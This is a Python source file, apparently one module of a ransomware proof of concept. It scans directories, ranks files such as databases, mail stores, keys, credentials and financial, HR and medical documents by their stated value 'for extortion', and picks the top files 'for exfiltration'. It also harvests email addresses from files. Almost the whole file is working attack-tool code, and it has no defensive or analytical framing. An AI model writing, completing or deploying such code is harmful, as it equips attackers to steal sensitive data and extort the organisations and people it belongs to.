#!/usr/bin/env python3
"""
Data classification module for ransomware PoC.
Identifies and prioritizes sensitive files for exfiltration.
"""

import os
import re
from pathlib import Path
from typing import Dict, List, Set, Tuple

from ransomware.logging import logger


class DataClassifier:
    """
    Classify files by sensitivity and value.
    Prioritizes files that would be valuable for extortion.
    """

    # File extensions to prioritize
    HIGH_VALUE_EXTENSIONS = {
        # Database files
        '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf', '.sql',
        '.bak', '.dump', '.db3', '.s3db', '.db-journal',

        # Email files
        '.pst', '.ost', '.eml', '.msg', '.mbox', '.nsf',

        # Document files
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.pdf', '.txt', '.rtf', '.odt', '.ods', '.odp',
        '.csv', '.tsv',

        # Source code and configs
        '.py', '.js', '.java', '.cpp', '.c', '.h', '.cs', '.php',
        '.conf', '.config', '.ini', '.json', '.xml', '.yaml', '.yml',
        '.env', '.key', '.pem', '.pfx', '.p12',

        # Accounting/Financial
        '.qbw', '.qbb', '.qbx', '.tax', '.turbotax',
    }

    # Keywords that indicate valuable data
    SENSITIVE_KEYWORDS = [
        # Financial
        'bank', 'credit', 'card', 'payment', 'transaction', 'invoice',
        'receipt', 'account', 'billing', 'finance', 'budget', 'tax',
        'salary', 'payroll', 'expense', 'revenue', 'profit', 'loss',

        # Personal
        'ssn', 'social', 'passport', 'id', 'identity', 'personal',
        'private', 'confidential', 'secret',

        # Business
        'contract', 'agreement', 'nda', 'proprietary', 'trade',
        'secret', 'intellectual', 'patent', 'copyright',

        # Security
        'password', 'credential', 'login', 'auth', 'token', 'key',
        'certificate', 'ssl', 'vpn', 'backup',

        # Corporate
        'board', 'executive', 'ceo', 'cfo', 'cio', 'cto', 'director',
        'shareholder', 'investor', 'acquisition', 'merger',

        # Legal
        'legal', 'lawsuit', 'litigation', 'compliance', 'regulatory',
        'audit', 'investigation',

        # Medical
        'patient', 'medical', 'health', 'hipaa', 'pharmacy', 'prescription',

        # HR
        'employee', 'hr', 'human', 'resources', 'resume', 'cv',
        'performance', 'review', 'disciplinary',

        # IT
        'server', 'database', 'backup', 'network', 'infrastructure',
        'cloud', 'aws', 'azure', 'gcp',
    ]

    # Directories that likely contain valuable data
    HIGH_VALUE_DIRECTORIES = [
        'documents', 'desktop', 'downloads', 'finance', 'accounting',
        'hr', 'legal', 'contracts', 'projects', 'clients', 'customers',
        'database', 'db', 'backups', 'backup', 'email', 'mail', 'outlook',
        'quickbooks', 'sage', 'crm', 'erp', 'accounting', 'payroll',
        'confidential', 'private', 'sensitive', 'restricted',
    ]

    def __init__(self):
        self.classified_files: Dict[str, List[Path]] = {
            'critical': [],      # Databases, emails
            'high': [],          # Financial docs, contracts
            'medium': [],        # Regular documents
            'low': [],           # Other files
        }

    def classify_file(self, file_path: Path) -> str:
        """
        Classify a single file by priority.
        Returns: 'critical', 'high', 'medium', or 'low'
        """
        # Check extension
        ext = file_path.suffix.lower()
        name = file_path.name.lower()
        parent = file_path.parent.name.lower()

        # Critical: Database and email files
        if ext in {'.db', '.sqlite', '.sqlite3', '.pst', '.ost', '.mdb', '.sql', '.dump', '.bak'}:
            return 'critical'

        # Critical: Files with critical keywords
        for keyword in ['password', 'credential', 'secret', 'key', 'backup']:
            if keyword in name:
                return 'critical'

        # High: Financial document extensions
        if ext in {'.xls', '.xlsx', '.csv', '.pdf', '.doc', '.docx'}:
            # Check for financial keywords
            for keyword in ['bank', 'finance', 'invoice', 'contract', 'tax', 'budget']:
                if keyword in name:
                    return 'high'

        # High: In high-value directories
        for hv_dir in self.HIGH_VALUE_DIRECTORIES:
            if hv_dir in str(file_path).lower():
                return 'high'

        # Medium: Other documents
        if ext in self.HIGH_VALUE_EXTENSIONS:
            return 'medium'

        # Low: Everything else
        return 'low'

    def scan_directory(self, root_path: Path, max_files: int = 10000) -> Dict[str, List[Path]]:
        """
        Scan directory and classify all files.
        """
        self.classified_files = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
        }

        file_count = 0

        try:
            for dirpath, dirnames, filenames in os.walk(root_path):
                for filename in filenames:
                    if file_count >= max_files:
                        break

                    file_path = Path(dirpath) / filename

                    try:
                        # Skip system files
                        if filename.startswith('.') or filename.startswith('~'):
                            continue

                        # Skip very large files initially (over 1GB)
                        try:
                            if file_path.stat().st_size > 1024 * 1024 * 1024:
                                continue
                        except Exception:
                            pass

                        # Classify
                        priority = self.classify_file(file_path)
                        self.classified_files[priority].append(file_path)
                        file_count += 1

                    except Exception:
                        pass

        except Exception as e:
            logger.error(f"Classification error: {e}")

        logger.info(f"Classified {file_count} files")
        return self.classified_files

    def get_priority_files(self, count: int = 100) -> List[Path]:
        """
        Get top priority files for exfiltration.
        Returns most valuable files first.
        """
        result = []

        # Add critical first
        result.extend(self.classified_files['critical'][:count])

        # Then high
        if len(result) < count:
            result.extend(self.classified_files['high'][:count - len(result)])

        # Then medium
        if len(result) < count:
            result.extend(self.classified_files['medium'][:count - len(result)])

        return result

    def get_exfiltration_size_estimate(self) -> Dict[str, int]:
        """
        Estimate total size of files by priority.
        """
        sizes = {}

        for priority, files in self.classified_files.items():
            total_size = 0
            for file_path in files:
                try:
                    total_size += file_path.stat().st_size
                except Exception:
                    pass
            sizes[priority] = total_size

        return sizes

    def generate_report(self) -> str:
        """Generate classification report."""
        report = []
        report.append("=" * 60)
        report.append("DATA CLASSIFICATION REPORT")
        report.append("=" * 60)

        for priority in ['critical', 'high', 'medium', 'low']:
            files = self.classified_files.get(priority, [])
            sizes = self.get_exfiltration_size_estimate()
            size_mb = sizes.get(priority, 0) / (1024 * 1024)

            report.append(f"\n{priority.upper()} Priority:")
            report.append(f"  Files: {len(files)}")
            report.append(f"  Size: {size_mb:.2f} MB")

            # Show sample files
            for f in files[:5]:
                report.append(f"    - {f}")
            if len(files) > 5:
                report.append(f"    ... and {len(files) - 5} more")

        total_files = sum(len(files) for files in self.classified_files.values())
        report.append(f"\nTotal files classified: {total_files}")
        report.append("=" * 60)

        return "\n".join(report)


class EmailSearcher:
    """
    Search for email files and email content.
    """

    EMAIL_PATTERNS = [
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    ]

    def __init__(self):
        self.emails_found: Set[str] = set()

    def extract_emails_from_file(self, file_path: Path, max_size: int = 10 * 1024 * 1024) -> List[str]:
        """
        Extract email addresses from text file.
        """
        emails = []

        try:
            # Skip binary files
            stat = file_path.stat()
            if stat.st_size > max_size:
                return []

            # Try to read as text
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Extract emails
            for pattern in self.EMAIL_PATTERNS:
                matches = re.findall(pattern, content)
                emails.extend(matches)

        except Exception:
            pass

        return emails

    def find_email_files(self, root_path: Path) -> List[Path]:
        """
        Find email-related files.
        """
        email_files = []
        email_extensions = {'.pst', '.ost', '.eml', '.msg', '.mbox', '.nsf'}

        try:
            for dirpath, dirnames, filenames in os.walk(root_path):
                for filename in filenames:
                    ext = Path(filename).suffix.lower()
                    if ext in email_extensions:
                        email_files.append(Path(dirpath) / filename)

        except Exception:
            pass

        return email_files


if __name__ == "__main__":
    import tempfile

    print("Data Classification Test")
    print("=" * 60)

    # Create test directory with sample files
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)

        # Create various file types
        (tmpdir / "database.db").write_text("test data")
        (tmpdir / "passwords.txt").write_text("admin:password123")
        (tmpdir / "budget_2024.xlsx").write_bytes(b"fake excel")
        (tmpdir / "contract_client.pdf").write_bytes(b"fake pdf")
        (tmpdir / "readme.txt").write_text("nothing important")

        # Create subdirectories
        finance_dir = tmpdir / "finance"
        finance_dir.mkdir()
        (finance_dir / "salaries.xlsx").write_bytes(b"fake excel")

        print(f"[*] Scanning: {tmpdir}")

        classifier = DataClassifier()
        classifier.scan_directory(tmpdir)

        print(classifier.generate_report())
